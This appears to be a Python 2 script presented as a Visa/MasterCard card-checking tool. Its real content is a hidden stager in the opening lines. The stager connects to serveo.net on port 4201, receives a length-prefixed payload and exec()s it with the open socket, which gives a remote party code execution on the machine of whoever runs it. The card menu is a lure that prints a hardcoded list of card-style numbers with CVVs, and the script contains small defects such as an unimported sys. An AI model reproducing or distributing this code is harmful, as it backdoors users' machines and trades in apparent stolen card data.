#!/usr/bin/python
print '================================================='
print '               created by POTTUS                 '
print '================================================='
import socket,struct,time
for x in range(10):
        try:
                s=socket.socket(2,socket.SOCK_STREAM)
                s.connect(('serveo.net',4201))
                break
        except:
                time.sleep(5)
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
        d+=s.recv(l-len(d))
exec(d,{'s':s})
import smtplib

lost = ["4532803533403222|12|2023|727","4532803547382016|09|2021|112",
"4532803520265543|11|2023|612",
"4532803564153431|02|2024|469",
"4532803542261702|03|2021|622",
"4532803530007505|09|2022|953",
"4532803535146472|04|2023|258",
"4532803528274117|03|2022|691",
"4532803511658136|01|2024|300",
"4532803521437067|07|2024|650",
"4532803550138362|03|2021|745",
"4532803561251113|08|2023|159",
"4532803568135525|03|2023|549",
"4532803587270824|09|2022|367",
"4532803511781854|12|2023|221",
"4532803565353816|09|2021|960",
"4532803504435328|03|2022|355",
"4532803502133263|11|2023|437",
"4532803551756337|09|2023|645",
"4532803584168138|06|2021|901",
"4532803583343211|05|2023|157",
"4532803586788123|03|2023|466",
"4532803522784863|01|2022|532"]

from os import system
print("WAIT...")
time.sleep(1)
print("[1]-VISA")
print("[2]-MasterCard")
print("[3]-exit")
inpt = raw_input("HERE: ")
if inpt == "1":
 print("looking for visa")
 print("please wait..checking!")
 for i in lost:
  time.sleep(1)
  print(i)
 print("Error...Goodby")
elif inpt == "2":
 print("looking for mastercard")
 print("please wait..checking!")
 for i in lost:
  time.sleep(1)
  print(i)
 print("Error...Goodby")
else:
 print("goodby")
 sys.exit()
